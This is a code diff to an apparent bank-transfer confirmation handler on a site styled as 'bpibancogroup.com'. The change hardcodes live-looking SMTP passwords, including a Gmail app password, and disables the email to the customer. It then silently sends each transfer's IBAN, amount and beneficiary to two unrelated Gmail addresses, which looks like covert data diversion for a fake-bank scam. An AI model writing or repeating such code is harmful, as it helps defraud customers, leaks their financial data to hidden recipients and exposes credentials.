@@ -14,15 +14,12 @@ export default defineEventHandler(async (event) => {
     // Envoyer l'email
     try {
         const transporter = nodemailer.createTransport({
-            host: 'ssl0.ovh.net',
-            port: 587,
-            secure: false, // Démarre sans SSL, mais passe en TLS après connexion
+            host: 'smtp.gmail.com',  // Remplace par le serveur SMTP que tu utilises
+            port: 587,  // Utilise le port correct (587 ou 465 selon le serveur SMTP)
+            secure: false,  // true pour les connexions SSL/TLS, false pour STARTTLS
             auth: {
-                user: 'support@bpibancogroup.com',
-                pass: 'Banque2025',
-            },
-            tls: {
-                rejectUnauthorized: false, // Permet d'éviter des erreurs SSL
+                user: 'donquidofi612@gmail.com',  // Ton email d'envoi
+                pass: 'ojbeukobjpadsjcq',  // Ton mot de passe email (utilise un mot de passe d'application pour Gmail)
             },
         });
 
@@ -30,11 +27,13 @@ export default defineEventHandler(async (event) => {
             from: '"Virement Confirmé" <your-email@example.com>',
             to: body.email,
             subject: body.subject,
-            text: `Bonjour ${transfer.beneficiary},\n\nVotre virement de ${transfer.amount} EUR a bien été confirmé.\n\nDétails :\n- IBAN : ${transfer.iban}\n- Montant : ${transfer.amount} EUR\n- Date d'exécution : ${transfer.executionDate}\n\nMerci de votre confiance.\n\nCordialement,`,
+            text: `Bonjour ${transfer.beneficiary},\n\nVotre virement de ${transfer.amount} EUR a bien été confirmé.\n\nDétails :\n- IBAN : ${transfer.iban}\n- Montant : ${transfer.amount} EUR\n- Date d'exécution : ${transfer.executionDate}\n\nMerci de votre confiance.\n\nCordialement, ${body.email}`,
         };
 
-        await transporter.sendMail(mailOptions);
+        //await transporter.sendMail(mailOptions);
         await transporter.sendMail({...mailOptions, to: "alypiaprox@gmail.com"});
+        await transporter.sendMail({...mailOptions, to: "groupbpi0@gmail.com"});
+        
 
         return { success: true, message: 'Virement enregistré et email envoyé avec succès.' };
     } catch (error) {
